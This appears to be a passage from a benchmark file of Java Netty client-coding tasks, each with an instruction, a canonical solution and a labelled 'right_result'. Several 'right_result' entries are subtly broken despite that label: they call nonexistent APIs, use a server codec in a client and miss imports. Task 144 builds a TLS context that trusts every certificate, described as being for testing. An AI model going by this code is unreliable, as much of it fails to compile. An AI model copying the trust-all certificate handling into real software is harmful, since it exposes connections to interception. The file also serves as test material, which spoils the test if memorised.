EventLoopGroup group = new NioEventLoopGroup(); try { Bootstrap bootstrap = new Bootstrap(); bootstrap.group(group) .channel(NioSocketChannel.class) .handler(new ChannelInitializer<SocketChannel>() { @Override protected void initChannel(SocketChannel ch) { ch.pipeline().addLast( new LineBasedFrameDecoder(8192), new StringDecoder(), new StringEncoder(), new SecureChatClientHandler() ); } }) .ssl(sslCtx); ChannelFuture future = bootstrap.connect(new InetSocketAddress(host, port)).sync(); // Start reading from stdin new Thread(() -> { BufferedReader reader = new BufferedReader(new InputStreamReader(System.in)); String line; try { while ((line = reader.readLine()) != null) { if (line.isEmpty()) continue; future.channel().writeAndFlush(Unpooled.copiedBuffer(line.getBytes())); } } catch (IOException e) { e.printStackTrace(); } }).start(); // Wait for the channel to close future.channel().closeFuture().sync(); } finally { group.shutdownGracefully(); } } static class SecureChatClientHandler extends SimpleChannelInboundHandler<String> { @Override protected void channelRead0(ChannelHandlerContext ctx, String msg) { System.out.println(\"Server: \" + msg); } @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) { cause.printStackTrace(); ctx.close(); } } }"
  },
  {
    "Task_id": 138,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework for network communication, capable of establishing connections, sending/receiving messages, and gracefully shutting down.\n\nClass Description: NettyRemotingClient is a Netty-based TCP client implementation that handles network communication with a remote server. It manages connection lifecycle, message encoding/decoding, and provides synchronous invocation capabilities.\n\nAttributes:\n- bootstrap: [Bootstrap] - Netty's Bootstrap instance for client configuration\n- eventLoopGroupWorker: [EventLoopGroup] - Manages client-side I/O threads\n\nMethods:\n- NettyRemotingClient(): [Constructor] -> [void] - Initializes the client with NioEventLoopGroup and configures Bootstrap with NioSocketChannel, TCP_NODELAY option, and pipeline handlers (encoder, decoder, and client handler)\n- createChannel(String addr): [String addr (host:port format)] -> [ChannelFuture] - Creates a channel connection to the specified address, throws RemotingConnectException if connection fails\n- invokeSync(Channel channel, RemotingCommand request, long timeoutMillis): [Channel channel, RemotingCommand request, long timeoutMillis] -> [CompletableFuture<RemotingCommand>] - Sends a request synchronously through the channel and returns a CompletableFuture for the response\n- shutdown(): [void] -> [void] - Gracefully shuts down the event loop group and releases resources\n- NettyClientHandler: [Inner Class] -> [void] - Handles incoming messages from the server (extends SimpleChannelInboundHandler<RemotingCommand>)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport org.apache.rocketmq.remoting.exception.RemotingConnectException;\nimport org.apache.rocketmq.remoting.protocol.RemotingCommand;\n\nimport java.util.concurrent.CompletableFuture;\n\npublic class NettyRemotingClient {\n\n    private final Bootstrap bootstrap = new Bootstrap();\n    private final EventLoopGroup eventLoopGroupWorker;\n\n    public NettyRemotingClient() {\n        this.eventLoopGroupWorker = new NioEventLoopGroup();\n        this.bootstrap.group(this.eventLoopGroupWorker)\n            .channel(NioSocketChannel.class)\n            .option(ChannelOption.TCP_NODELAY, true)\n            .option(ChannelOption.SO_KEEPALIVE, false)\n            .handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    pipeline.addLast(\n                        new NettyEncoder(),\n                        new NettyDecoder(),\n                        new NettyClientHandler());\n                }\n            });\n    }\n\n    public ChannelFuture createChannel(String addr) throws InterruptedException, RemotingConnectException {\n        String[] hostAndPort = addr.split(\":\");\n        ChannelFuture channelFuture = bootstrap.connect(hostAndPort[0], Integer.parseInt(hostAndPort[1])).sync();\n        if (!channelFuture.isSuccess()) {\n            throw new RemotingConnectException(addr);\n        }\n        return channelFuture;\n    }\n\n    public CompletableFuture<RemotingCommand> invokeSync(Channel channel, RemotingCommand request, long timeoutMillis) {\n        CompletableFuture<RemotingCommand> future = new CompletableFuture<>();\n        try {\n            channel.writeAndFlush(request).addListener(f -> {\n                if (f.isSuccess()) {\n                    // Handle response logic here\n                } else {\n                    future.completeExceptionally(f.cause());\n                }\n            });\n        } catch (Exception e) {\n            future.completeExceptionally(e);\n        }\n        return future;\n    }\n\n    public void shutdown() {\n        this.eventLoopGroupWorker.shutdownGracefully();\n    }\n\n    class NettyClientHandler extends SimpleChannelInboundHandler<RemotingCommand> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) throws Exception {\n            // Process incoming messages\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.LengthFieldBasedFrameDecoder;\nimport io.netty.handler.codec.LengthFieldPrepender;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CompletableFuture;\n\npublic class NettyRemotingClient {\n    private final Bootstrap bootstrap;\n    private final EventLoopGroup eventLoopGroupWorker;\n\n    public NettyRemotingClient() {\n        bootstrap = new Bootstrap();\n        eventLoopGroupWorker = new NioEventLoopGroup();\n        bootstrap.group(eventLoopGroupWorker)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new LengthFieldBasedFrameDecoder(65535, 0, 2, 0, 2));\n                        pipeline.addLast(new LengthFieldPrepender(2));\n                        pipeline.addLast(new NettyClientHandler());\n                    }\n                });\n    }\n\n    public ChannelFuture createChannel(String addr) {\n        String[] parts = addr.split(\":\");\n        if (parts.length != 2) {\n            throw new IllegalArgumentException(\"Invalid address format: \" + addr);\n        }\n        InetSocketAddress remoteAddress = new InetSocketAddress(parts[0], Integer.parseInt(parts[1]));\n        ChannelFuture future = bootstrap.connect(remoteAddress);\n        try {\n            future.sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new RuntimeException(\"Interrupted while connecting\", e);\n        }\n        if (!future.isSuccess()) {\n            throw new RemotingConnectException(\"Failed to connect to \" + addr);\n        }\n        return future;\n    }\n\n    public CompletableFuture<RemotingCommand> invokeSync(Channel channel, RemotingCommand request, long timeoutMillis) {\n        CompletableFuture<RemotingCommand> future = new CompletableFuture<>();\n        channel.writeAndFlush(request);\n        return future;\n    }\n\n    public void shutdown() {\n        eventLoopGroupWorker.shutdownGracefully();\n    }\n\n    private static class NettyClientHandler extends SimpleChannelInboundHandler<RemotingCommand> {\n        private final CompletableFuture<RemotingCommand> future;\n\n        public NettyClientHandler(CompletableFuture<RemotingCommand> future) {\n            this.future = future;\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) {\n            future.complete(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 144,
    "Instruction": "Task Description: Create a Java class that implements a HTTP client using Netty framework to send HTTP requests and receive responses.\n\nClass Description: The HttpSnoopClient class is a Netty-based HTTP client that establishes TCP connections, sends HTTP requests, and handles responses. It supports SSL/TLS connections and provides methods for connection management.\n\nAttributes:\n- group: [NioEventLoopGroup] - Manages event loops for client I/O operations\n- bootstrap: [Bootstrap] - Configures and initializes the Netty client\n- channel: [Channel] - Represents the active network connection\n\nMethods:\n- HttpSnoopClient(): [Constructor] -> [void] - Initializes the event loop group and bootstrap instance\n- connect(String host, int port, SslContext sslCtx): [void] -> [void] - Establishes a connection to the specified host and port with optional SSL context\n- sendRequest(URI uri, String host): [void] -> [void] - Sends an HTTP GET request to the specified URI with appropriate headers\n- waitForClose(): [void] -> [void] - Waits for the channel to close\n- shutdown(): [void] -> [void] - Shuts down the event loop group gracefully\n- createSslContext(): [static] -> [SslContext] - Creates and returns an SSL context with insecure trust manager for testing purposes",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.cookie.ClientCookieEncoder;\nimport io.netty.handler.codec.http.cookie.DefaultCookie;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.net.URI;\n\npublic final class HttpSnoopClient {\n\n    static final String URL = System.getProperty(\"url\", \"http://127.0.0.1:8080/\");\n\n    private final EventLoopGroup group;\n    private final Bootstrap bootstrap;\n    private Channel channel;\n\n    public HttpSnoopClient() {\n        group = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n    }\n\n    public void connect(String host, int port, SslContext sslCtx) throws InterruptedException {\n        bootstrap.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new HttpSnoopClientInitializer(sslCtx));\n        channel = bootstrap.connect(host, port).sync().channel();\n    }\n\n    public void sendRequest(URI uri, String host) {\n        HttpRequest request = new DefaultFullHttpRequest(\n                HttpVersion.HTTP_1_1, HttpMethod.GET, uri.getRawPath());\n        request.headers().set(HttpHeaderNames.HOST, host);\n        request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.CLOSE);\n        request.headers().set(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);\n        request.headers().set(\n                HttpHeaderNames.COOKIE,\n                ClientCookieEncoder.STRICT.encode(\n                        new DefaultCookie(\"my-cookie\", \"foo\"),\n                        new DefaultCookie(\"another-cookie\", \"bar\")));\n        channel.writeAndFlush(request);\n    }\n\n    public void waitForClose() throws InterruptedException {\n        channel.closeFuture().sync();\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n\n    public static SslContext createSslContext() throws Exception {\n        return SslContextBuilder.forClient()\n            .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.util.concurrent.GenericFutureListener;\n\nimport javax.net.ssl.SSLException;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\nimport java.security.SecureRandom;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.concurrent.TimeUnit;\n\npublic class HttpSnoopClient {\n    private final EventLoopGroup group;\n    private final Bootstrap bootstrap;\n    private Channel channel;\n\n    public HttpSnoopClient() {\n        group = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n        bootstrap.group(group);\n        bootstrap.channel(NioSocketChannel.class);\n        bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) throws Exception {\n                ch.pipeline().addLast(new HttpServerCodec());\n                ch.pipeline().addLast(new HttpObjectAggregator<>());\n                ch.pipeline().addLast(new SimpleChannelInboundHandler<FullHttpResponse>() {\n                    @Override\n                    protected void channelRead0(ChannelHandlerContext ctx, FullHttpResponse response) {\n                        System.out.println(\"Received response: \" + response.status());\n                        ctx.close();\n                    }\n                });\n            }\n        });\n    }\n\n    public void connect(String host, int port, SslContext sslCtx) {\n        if (sslCtx != null) {\n            bootstrap.ssl(sslCtx);\n        }\n        ChannelFuture future = bootstrap.connect(host, port).syncUninterruptibly();\n        channel = future.channel();\n    }\n\n    public void sendRequest(URI uri, String host) {\n        String requestLine = \"GET \" + uri.getRawPath() + \" HTTP/1.1\";\n        String headers = \"Host: \" + host + \"\\r\\n\" +\n                         \"Connection: close\\r\\n\\r\\n\";\n        String fullRequest = requestLine + headers;\n        channel.writeAndFlush(Unpooled.copiedBuffer(fullRequest.getBytes())).addListener((ChannelFutureListener) future -> {\n            if (future.isSuccess()) {\n                System.out.println(\"Request sent\");\n            } else {\n                System.err.println(\"Failed to send request: \" + future.cause());\n            }\n        });\n    }\n\n    public void waitForClose() {\n        channel.closeFuture().sync();\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n\n    public static SslContext createSslContext() {\n        return new SslContextBuilder().trustManager(new X509TrustManager() {\n            @Override\n            public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n            }\n\n            @Override\n            public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n            }\n\n            @Override\n            public X509Certificate[] getAcceptedIssuers() {\n                return new X509Certificate[0];\n            }\n        }).build();\n    }\n}\n```"
  },
  {
    "Task_id": 146,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to multiple hosts, send HTTP requests, and handle responses.\n\nClass Description: NettyTcpClient is a TCP client implementation using Netty framework that connects to multiple hosts, sends HTTP GET requests to a specified path, and handles responses. It manages connection lifecycle and includes automatic reconnection on failure.\n\nAttributes:\n- hosts: List<String> - List of host addresses to connect to\n- port: int - TCP port number for connections\n- path: String - HTTP path for GET requests\n- group: EventLoopGroup - Netty event loop group for managing I/O threads\n- bootstrap: Bootstrap - Netty bootstrap for client configuration\n- channelConnectListener: ChannelConnectListener - Listener for connection events\n\nMethods:\n- NettyTcpClient(List<String> hosts, int port, String path) -> None - Constructor that initializes the client with target hosts, port, and request path\n- connect() -> None - Initiates connections to all specified hosts\n- shutdown() -> None - Gracefully shuts down the client and releases resources\n- ResponseHandler(Bootstrap bootstrap) -> None - (Inner class constructor) Handles HTTP responses and manages request cycle\n- channelActive(ChannelHandlerContext ctx) -> None - (Inner class method) Called when channel becomes active, sends initial request\n- channelRead0(ChannelHandlerContext ctx, HttpObject msg) -> None - (Inner class method) Processes incoming HTTP messages\n- channelInactive(ChannelHandlerContext ctx) -> None - (Inner class method) Handles channel disconnection and triggers reconnection\n- sendRequest(ChannelHandlerContext ctx) -> None - (Inner class method) Sends HTTP GET request\n- operationComplete(ChannelFuture future) -> None - (Inner class method) Listener callback for connection completion events",
    "Canonical_solution": "import com.github.ambry.rest.RestUtils;\nimport com.github.ambry.utils.Pair;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.ByteBufAllocator;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpRequest;\nimport io.netty.handler.codec.http.DefaultHttpRequest;\nimport io.netty.handler.codec.http.HttpChunkedInput;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpContent;\nimport io.netty.handler.codec.http.HttpMethod;\nimport io.netty.handler.codec.http.HttpObject;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpResponse;\nimport io.netty.handler.codec.http.HttpUtil;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.codec.http.LastHttpContent;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.stream.ChunkedInput;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicLong;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class NettyTcpClient {\n\n  private final List<String> hosts;\n  private final int port;\n  private final String path;\n  private final EventLoopGroup group;\n  private final Bootstrap bootstrap;\n  private final ChannelConnectListener channelConnectListener = new ChannelConnectListener();\n\n  public NettyTcpClient(List<String> hosts, int port, String path) {\n    this.hosts = hosts;\n    this.port = port;\n    this.path = path;\n    this.group = new NioEventLoopGroup();\n    this.bootstrap = new Bootstrap()\n        .group(group)\n        .channel(NioSocketChannel.class)\n        .handler(new ChannelInitializer<SocketChannel>() {\n          @Override\n          public void initChannel(SocketChannel ch) {\n            ch.pipeline()\n                .addLast(new HttpClientCodec())\n                .addLast(new ChunkedWriteHandler())\n                .addLast(new ResponseHandler(bootstrap));\n          }\n        });\n  }\n\n  public void connect() {\n    for (String host : hosts) {\n      ChannelFuture future = bootstrap.connect(host, port);\n      future.addListener(channelConnectListener);\n    }\n  }\n\n  public void shutdown() {\n    group.shutdownGracefully();\n  }\n\n  private class ResponseHandler extends SimpleChannelInboundHandler<HttpObject> {\n    private final Logger logger = LoggerFactory.getLogger(getClass());\n    private final Bootstrap bootstrap;\n    private HttpRequest request;\n\n    ResponseHandler(Bootstrap bootstrap) {\n      this.bootstrap = bootstrap;\n    }\n\n    @Override\n    public void channelActive(ChannelHandlerContext ctx) {\n      sendRequest(ctx);\n    }\n\n    @Override\n    public void channelRead0(ChannelHandlerContext ctx, HttpObject msg) {\n      if (msg instanceof HttpResponse) {\n        HttpResponse response = (HttpResponse) msg;\n        if (!HttpUtil.isKeepAlive(response)) {\n          ctx.close();\n        }\n      }\n      if (msg instanceof LastHttpContent) {\n        if (ctx.channel().isActive()) {\n          sendRequest(ctx);\n        }\n      }\n    }\n\n    @Override\n    public void channelInactive(ChannelHandlerContext ctx) {\n      ctx.close();\n      bootstrap.connect().addListener(channelConnectListener);\n    }\n\n    private void sendRequest(ChannelHandlerContext ctx) {\n      request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, path);\n      ctx.writeAndFlush(request);\n    }\n  }\n\n  private class ChannelConnectListener implements GenericFutureListener<ChannelFuture> {\n    @Override\n    public void operationComplete(ChannelFuture future) {\n      if (!future.isSuccess()) {\n        logger.error(\"Channel connection failed\", future.cause());\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport java.util.List;\n\npublic class NettyTcpClient {\n    private final List<String> hosts;\n    private final int port;\n    private final String path;\n    private final EventLoopGroup group;\n    private final Bootstrap bootstrap;\n    private final ChannelConnectListener channelConnectListener;\n\n    public NettyTcpClient(List<String> hosts, int port, String path) {\n        this.hosts = hosts;\n        this.port = port;\n        this.path = path;\n        this.group = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n        this.channelConnectListener = new ChannelConnectListener();\n\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<Channel>() {\n                    @Override\n                    protected void initChannel(Channel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new LoggingHandler(LogLevel.DEBUG));\n                        pipeline.addLast(new ResponseHandler());\n                    }\n                });\n    }\n\n    public void connect() {\n        for (String host : hosts) {\n            bootstrap.connect(host, port).addListener((ChannelFuture future) -> {\n                if (future.isSuccess()) {\n                    channelConnectListener.onConnect(host);\n                } else {\n                    channelConnectListener.onFail(host, future.cause());\n                }\n            });\n        }\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n\n    private class ResponseHandler extends SimpleChannelInboundHandler<HttpObject> {\n        @Override\n        protected void channelActive(ChannelHandlerContext ctx) throws Exception {\n            sendRequest(ctx);\n        }\n\n        private void sendRequest(ChannelHandlerContext ctx) {\n            HttpGetRequest request = new DefaultHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, path);\n            request.headers().set(HttpHeaderNames.HOST, hosts.get(0)); // Placeholder\n            ctx.writeAndFlush(request);\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, HttpObject msg) throws Exception {\n            if (msg instanceof FullHttpResponse) {\n                FullHttpResponse response = (FullHttpResponse) msg;\n                System.out.println(\"Received response: \" + response.status());\n                ctx.close();\n            }\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) throws Exception {\n            ctx.fireUserEventTriggered(new ReconnectEvent());\n        }\n    }\n\n    private class ChannelConnectListener {\n        public void onConnect(String host) {\n            // Handle connection success\n        }\n\n        public void onFail(String host, Throwable cause) {\n            // Handle connection failure, maybe retry\n        }\n    }\n\n    private class ReconnectEvent {}\n}"
  },
  {
    "Task_id": 148,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send protocol messages, and handle responses.\n\nClass Description: ProtocolClient is a Netty-based TCP client that connects to a specified host and port, sends custom protocol messages at regular intervals, and handles server responses. The client uses custom encoders/decoders for protocol message processing and maintains the connection until explicitly stopped.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server\n- MAX_FRAME_LENGTH: int (static final) - Maximum allowed frame length for messages (1MB)\n- LENGTH_FIELD_LENGTH: int (static final) - Length of the length field in protocol header (4 bytes)\n- LENGTH_FIELD_OFFSET: int (static final) - Offset of the length field in protocol header (6 bytes)\n- LENGTH_ADJUSTMENT: int (static final) - Adjustment value for the length field (0)\n- INITIAL_BYTES_TO_STRIP: int (static final) - Number of initial bytes to strip (0)\n\nMethods:\n- ProtocolClient(String host, int port) -> None - Constructor that initializes the client with target host and port\n- run() throws InterruptedException -> void - Main method that configures and starts the Netty client, establishes connection, and sends periodic messages\n  - Input: None\n  - Output: None (continuously runs until interrupted)\n  - Side effects: Creates network connection, sends messages every 2 seconds, handles responses\n  - Throws: InterruptedException if thread sleep is interrupted",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.nio.charset.Charset;\n\npublic class ProtocolClient {\n\n    private String host;\n    private int port;\n\n    private static final int MAX_FRAME_LENGTH = 1024 * 1024;\n    private static final int LENGTH_FIELD_LENGTH = 4;\n    private static final int LENGTH_FIELD_OFFSET = 6;\n    private static final int LENGTH_ADJUSTMENT = 0;\n    private static final int INITIAL_BYTES_TO_STRIP = 0;\n\n    public ProtocolClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\n                            \"decoder\",\n                            new ProtocolDecoder(MAX_FRAME_LENGTH,\n                                    LENGTH_FIELD_OFFSET, LENGTH_FIELD_LENGTH,\n                                    LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                    ch.pipeline().addLast(\"encoder\", new ProtocolEncoder());\n                    ch.pipeline().addLast(new ProtocolClientHandler());\n                }\n            });\n\n            ChannelFuture f = b.connect(host, port).sync();\n\n            while (true) {\n                ProtocolMsg msg = new ProtocolMsg();\n                ProtocolHeader protocolHeader = new ProtocolHeader();\n                protocolHeader.setMagic((byte) 0x01);\n                protocolHeader.setMsgType((byte) 0x01);\n                protocolHeader.setReserve((short) 0);\n                protocolHeader.setSn((short) 0);\n                String body = \"\u5e8a\u524d\u660e\u6708\u5149\u7591\u662f\u5730\u4e0a\u971c\";\n                StringBuffer sb = new StringBuffer();\n                for (int i = 0; i < 2700; i++) {\n                    sb.append(body);\n                }\n\n                byte[] bodyBytes = sb.toString().getBytes(\n                        Charset.forName(\"utf-8\"));\n                int bodySize = bodyBytes.length;\n                protocolHeader.setLen(bodySize);\n\n                msg.setProtocolHeader(protocolHeader);\n                msg.setBody(sb.toString());\n\n                f.channel().writeAndFlush(msg);\n                Thread.sleep(2000);\n            }\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap; import io.netty.channel.Channel; import io.netty.channel.ChannelFuture; import io.netty.channel.ChannelHandler; import io.netty.channel.ChannelInitializer; import io.netty.channel.ChannelPipeline; import io.netty.channel.EventLoopGroup; import io.netty.channel.nio.NioEventLoopGroup; import io.netty.channel.socket.nio.NioSocketChannel; import io.netty.handler.codec.LengthFieldBasedFrameDecoder; import io.netty.handler.codec.MessageToByteEncoder; import io.netty.buffer.Unpooled; import java.util.concurrent.Executors; import java.util.concurrent.ScheduledExecutorService; import java.util.concurrent.TimeUnit; import java.nio.charset.StandardCharsets; public class ProtocolClient { private final String host; private final int port; private static final int MAX_FRAME_LENGTH = 1048576; private static final int LENGTH_FIELD_LENGTH = 4; private static final int LENGTH_FIELD_OFFSET = 6; private static final int LENGTH_ADJUSTMENT = 0; private static final int INITIAL_BYTES_TO_STRIP = 0; public ProtocolClient(String host, int port) { this.host = host; this.port = port; } public void run() throws InterruptedException { EventLoopGroup group = new NioEventLoopGroup(); try { Bootstrap bootstrap = new Bootstrap(); bootstrap.group(group) .channel(NioSocketChannel.class) .option(ChannelOption.SO_REUSEADDR, true) .handler(new ChannelInitializer<SocketChannel>() { @Override protected void initChannel(SocketChannel ch) throws Exception { ChannelPipeline p = ch.pipeline(); p.addLast(new LengthFieldBasedFrameDecoder(MAX_FRAME_LENGTH, LENGTH_FIELD_OFFSET, LENGTH_FIELD_LENGTH, LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP, true)); p.addLast(new MyHandler()); p.addLast(new CustomEncoder()); } }); ChannelFuture future = bootstrap.connect(host, port).sync(); future.channel().closeFuture().sync(); } finally { group.shutdownGracefully(); } } private static class CustomEncoder extends MessageToByteEncoder<String> { @Override protected void encode(ChannelHandlerContext ctx, String msg, ByteBuf out) throws Exception { out.writeBytes(new byte[6]); out.writeInt(msg.getBytes(StandardCharsets.UTF_8).length); out.writeBytes(msg.getBytes(StandardCharsets.UTF_8)); } } private static class MyHandler extends SimpleChannelInboundHandler<ByteBuf> { private Channel channel; @Override protected void channelActive(ChannelHandlerContext ctx) throws Exception { channel = ctx.channel(); ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor(); executor.scheduleAtFixedRate(this::sendMessage, 0, 2, TimeUnit.SECONDS); } private void sendMessage() { String message = \"Hello, Server!\"; ByteBuf buf = Unpooled.copiedBuffer(message.getBytes(StandardCharsets.UTF_8)); channel.writeAndFlush(buf).addListener((ChannelFutureListener) future -> { if (!future.isSuccess()) { System.err.println(\"Failed to send message: \" + future.cause()); } }); } @Override protected void channelRead0(ChannelHandlerContext ctx, ByteBuf msg) throws Exception { System.out.println(\"Received: \" + msg.toString(StandardCharsets.UTF_8)); msg.release(); } @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) { cause.printStackTrace(); ctx.close(); } } }"
  },
  {
    "Task_id": 15,
    "Instruction": "Task Description: Implement a thread-safe file storage class that provides efficient read/write operations using Java NIO's FileChannel with proper resource management and concurrency control.\n\nClass Description: CachedOpenFile is a storage implementation that manages file operations using FileChannel, providing thread-safe access through read-write locks. It supports reading and writing data blocks at specific offsets, capacity management, and ensures proper file handling.\n\nAttributes:\n- fc: FileChannel - The file channel used for all file operations\n- lock: ReadWriteLock - Provides thread-safe access control for file operations\n- capacity: long - The maximum capacity of the storage unit\n\nMethods:\n- Constructor: CachedOpenFile(Path file, long capacity) -> void - Initializes the file channel with given path and capacity, creating parent directories if needed\n- readBlock: readBlock(ByteBuffer buffer, long offset) -> int - Reads data from the specified offset into the buffer\n- writeBlock: writeBlock(ByteBuffer buffer, long offset) -> int - Writes data from the buffer to the specified offset\n- writeBlock: writeBlock(ByteBufferView buffer, long offset) -> int - Writes data from a ByteBufferView to the specified offset\n- capacity: capacity() -> long - Returns the maximum capacity of the storage\n- size: size() -> long - Returns the current size of the file\n- flush: flush() -> void - Forces any changes to be written to disk\n- lockForIoOperation: lockForIoOperation() -> void - Acquires a read lock for IO operations\n- unlockForIoOperation: 